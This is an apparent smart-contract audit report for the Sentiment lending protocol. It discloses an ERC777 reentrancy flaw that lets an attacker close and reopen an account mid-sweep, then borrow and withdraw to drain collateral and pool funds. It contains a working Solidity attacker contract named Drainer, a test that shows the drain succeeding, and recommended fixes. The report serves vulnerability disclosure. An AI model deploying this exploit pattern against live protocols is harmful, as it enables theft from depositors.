Tutturu
# Protocol can be drained via an ERC777 token

## Summary
Account borrowed assets and collateral can be drained by diverting the execution flow if the collateral is an ERC777 token.

## Vulnerability Detail
The vulnerability leverages a few different aspects of the protocol, namely:
	1. An Account can be closed and then reopened in the same transaction
	2. Any number of Accounts can be created for a single address
	3. An Account that is closed will sweep the collateral tokens one by one, starting with the first deposited one
	4. Borrowed assets can be withdrawn from the Account as long as collateralValue - valueOfWithdrawnTokens / accountBorrowsValue is > 1.2e18
	5. ERC777 tokens can divert the execution flow by calling a ```tokenReceived()``` function on the receiver of the tokens. 

This allows an attacker to drain both the collateral and the borrowed assets by exploiting the diverted execution flow and reopening of Accounts. 

We assume the attacker has prepared a smart contract that implements a ```tokenReceived()``` hook as well as a fallback or receive function. The execution flow would be as follows:

1. Attacker opens an Account (or multiple) from a smart contract via ```openAccount()```. Since the attacker cannot close the Account in the same block, he waits for at least one block.
2. Attacker deposits a large amount of collateral in the form of any amount of ERC777 token and a large amount of ETH. An attacker can utilize a flashloan to increase their deposit amount.
3. Attacker closes the Account without borrowing any assets
4. The Account is closed and the ```sweepTo()``` function is called, the ERC777 token transfer triggers the ```tokenReceived()``` hook in the smart contract
5. The receive hook triggers:
	1. ```openAccount()```, opening the same account that was just closed
	2. ```borrow()``` to borrow a large amount of assets. This passes since the Account is active and there is still collateral inside the Account
	3. ```withdraw()```, to withdraw the borrowed assets. This passes as long as the collateralValue - valueOfWithdrawnTokens / accountBorrowsValue is > 1.2e18
6. Having withdrawn the borrowed assets, the execution flow is returned to ```sweepTo()``` which proceeds to withdraw the rest of the collateral. If the attacker has prepared multiple Accounts, they can use the receive() or fallback() function to trigger the attack again on a new Account
7. If the attacker used a flashloan, they can repay their loan at the end of execution since ETH is the last asset to be transferred
8. All "used" Accounts are left with bad debt, the attacker has successfully drained their collateral and the borrowed assets, and potentially the entire pool.

Another way to exploit this vulnerability, which is even simpler, is to deposit a small amount of ERC777, a large amount of ETH as collateral, and a small amount of any ERC20 token you would like to drain. Then all you need to do is close the account, reopen it via the ```tokenReceived()``` hook, borrow a large amount of the ERC20 you deposited (which was already in the assets array when ```sweepTo()``` was called), and then just let ```sweepTo()``` withdraw the borrowed asset for you. 

## Impact
Due to the nature of the attack, the fact that it can be exploited in multiple ways, and the possibility of utilizing flashloans as well as draining multiple Accounts, this attack has the potential to drain the protocol. It is also extremely profitable, easy to execute, and requires minimal initial funds from the attacker.  

## Code Snippet

Necessary additions to setupContracts:
- A mock ERC1820Registry contract 
- A mock ERC777 with the address of the locally deployed registry

Example attacker implementation
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import {IAccountManager} from "../../interface/core/IAccountManager.sol";
import {IRegistry} from "../../interface/core/IRegistry.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IERC1820Registry {
	function setInterfaceImplementer(
		address _addr,
		bytes32 _interfaceHash,
		address _implementer
	) external;

}

contract Drainer {
	uint256 borrowAmount;
	bool attacked;

	address admin;
	IERC20 erc777;
	address account;
	address weth;

	IAccountManager accountManager;
	IRegistry accountRegistry;
	IERC1820Registry receiverRegistry;

	constructor(
		address _accountManager,
		address _accRegistry,
		address _recRegistry,
		address _erc777,
		address _weth
	) {
		admin = msg.sender;
		erc777 = IERC20(_erc777);
		accountManager = IAccountManager(_accountManager);
		accountRegistry = IRegistry(_accRegistry);
		receiverRegistry = IERC1820Registry(_recRegistry);
		weth = _weth;

		// Register contract as a receiver
		receiverRegistry.setInterfaceImplementer(
			address(this),
			keccak256("ERC777TokensRecipient"),
			address(this)
		);
	}

	function prepare(uint256 amount) external payable {
		// Open the account
		accountManager.openAccount(address(this));
		// Get the address of the account and store it
		account = accountRegistry.accountsOwnedBy(address(this))[0];
		// Set borrow amount to 1/10 of collateral
		borrowAmount = address(this).balance / 10;
		// Approve accountManager to handle tokens
		erc777.approve(address(accountManager), amount);
		// Deposit any amount of ERC777
		accountManager.deposit(account, address(erc777), amount);
		// Deposit a large amount of ETH
		accountManager.depositEth{value: address(this).balance}(account);
	}

	function startAttack() external {
		attacked = true;
		accountManager.closeAccount(account);
	}

	function tokensReceived(
		address operator,
		address from,
		address to,
		uint256 amount,
		bytes memory userData,
		bytes memory operatorData
	) external {
		require(msg.sender == address(erc777), "Wrong sender");
		
		if (attacked) {
			attacked = false;
			_attack();
		}
	}

	function _attack() internal {
		// Reopen the account
		accountManager.openAccount(address(this));
		// Borrow WETH
		accountManager.borrow(account, weth, borrowAmount);
		// Withdraw borrowed WETH
		accountManager.withdraw(account, weth, borrowAmount);

		// Flow of execution returns to sweepTo() and withdraws
		// the rest of the collateral to the attacker
	}

	fallback() external payable {
		// Not used in this example but it could be used
		// to attack another account after the current one is drained,
		// or to repay a flashloan
	}

	receive() external payable {
		// Not used in this example but it could be used
		// to attack another account after the current one is drained,
		// or to repay a flashloan
	}
}
```

Example test case
```solidity
	using FixedPointMathLib for uint256;
	address account;
	address public owner = cheats.addr(1);  

	// Attack contract
	Drainer drainer;

	function setUp() public {
		setupContracts();
		account = openAccount(owner);

		drainer = new Drainer(
			address(accountManager),
			address(registry),
			address(erc1820registry),
			address(erc777),
			address(weth)
		);
	}

	function testDrain() public {
		// Setup
		uint256 tokenPoolAmount = 1000 ether;
		uint256 collateral = 100 ether;
		uint256 borrowAmount = collateral / 10;

		// give some erc777 to drainer
		erc777.mint(address(drainer), 1 ether);

		// give some eth to drainer
		vm.deal(address(drainer), collateral);

		// Deposit some ETH into lending pool
		cheats.deal(lender, tokenPoolAmount);
		cheats.prank(lender);
		lEth.depositEth{value: tokenPoolAmount}();

		drainer.prepare(1 ether);
		// since you can't close an account during the same block
		// we need to change the block number to simulate waiting
		// a block
		vm.roll(2);
		drainer.startAttack();

		assertEq(address(drainer).balance, collateral);
		assertEq(weth.balanceOf(address(drainer)), borrowAmount);
	}
```


Affected functions:
- Open and close Accounts: [AccountManager.sol#L90-L123](https://github.com/sherlock-audit/2022-08-sentiment-tuturu-tech/blob/518b6d4f8caaffd4cd2c2f4483b11170dccbdeeb/protocol/src/core/AccountManager.sol#L90-L123)
- Deposit and withdraw: [AccountManager.sol#L183-L217](https://github.com/sherlock-audit/2022-08-sentiment-tuturu-tech/blob/518b6d4f8caaffd4cd2c2f4483b11170dccbdeeb/protocol/src/core/AccountManager.sol#L183-L217)
- sweepTo(): [Account.sol#L163-L174](https://github.com/sherlock-audit/2022-08-sentiment-tuturu-tech/blob/518b6d4f8caaffd4cd2c2f4483b11170dccbdeeb/protocol/src/core/Account.sol#L163-L174)

## Tool used
Manual Review

## Recommendation
 - When an Account is closed save the block.number and don't allow it to be reopened in the same block, and/or
 - Add a flag and modifier that disallows interacting with the AccountManager functions while the account is being closed/swept.
